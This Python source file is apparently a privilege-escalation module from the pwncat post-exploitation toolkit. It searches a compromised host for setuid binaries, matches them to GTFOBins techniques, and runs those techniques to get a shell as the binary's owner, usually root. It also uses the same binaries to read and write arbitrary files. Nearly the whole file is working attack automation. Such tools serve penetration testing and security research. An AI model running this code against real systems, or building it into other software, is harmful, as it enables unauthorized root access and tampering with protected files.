#!/usr/bin/env python3
from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style

import io

from pwncat.privesc.base import Method, PrivescError, Technique, Capability
from pwncat import gtfobins
from pwncat.file import RemoteBinaryPipe
from pwncat import util


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find", "stat"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SetuidMethod, self).__init__(pty)

        self.users_searched = []
        self.suid_paths = {}

    def find_suid(self):

        current_user = self.pty.whoami()

        # Only re-run the search if we haven't searched as this user yet
        if current_user in self.users_searched:
            return

        # Note that we already searched for binaries as this user
        self.users_searched.append(current_user)

        # Spawn a find command to locate the setuid binaries
        files = []
        with self.pty.subprocess(
            "find / -perm -4000 -print 2>/dev/null", mode="r"
        ) as stream:
            util.progress("searching for setuid binaries")
            for path in stream:
                path = path.strip()
                util.progress(f"searching for setuid binaries: {path}")
                files.append(path)

        util.success("searching for setuid binaries: complete", overlay=True)

        for path in files:
            user = (
                self.pty.run(f"stat -c '%U' {shlex.quote(path)}")
                .strip()
                .decode("utf-8")
            )
            if user not in self.suid_paths:
                self.suid_paths[user] = []
            # Only add new binaries
            if path not in self.suid_paths[user]:
                self.suid_paths[user].append(path)

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        # Update the cache for the current user
        self.find_suid()

        known_techniques = []
        for user, paths in self.suid_paths.items():
            for path in paths:
                binary = gtfobins.Binary.find(self.pty.which, path=path)
                if binary is not None:
                    if (capability & binary.capabilities) == 0:
                        continue

                    known_techniques.append(
                        Technique(user, self, binary, binary.capabilities)
                    )

        return known_techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        binary = technique.ident
        enter, input, exit = binary.shell(self.pty.shell, suid=True)

        before_shell_level = self.pty.run("echo $SHLVL").strip()
        before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0

        # Run the start commands
        self.pty.run(enter + "\n", wait=False)
        # self.pty.process(enter, delim=False)

        # Send required input
        self.pty.client.send(input.encode("utf-8"))

        # Wait for result
        self.pty.run("echo")

        # sleep(0.1)
        user = self.pty.run("whoami").strip().decode("utf-8")
        if user == technique.user:
            return exit
        else:
            after_shell_level = self.pty.run("echo $SHLVL").strip()
            after_shell_level = (
                int(after_shell_level) if after_shell_level != b"" else 0
            )
            if after_shell_level > before_shell_level:
                self.pty.run(exit, wait=False)  # here be dragons

        raise PrivescError(f"escalation failed for {technique}")

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
        binary = technique.ident
        read_payload = binary.read_file(filepath)

        read_pipe = self.pty.subprocess(read_payload)

        return read_pipe

    def write_file(self, filepath: str, data: bytes, technique: Technique):
        binary = technique.ident
        payload = binary.write_file(filepath, data)

        self.pty.run(payload)

    def get_name(self, tech: Technique):
        return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident.path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
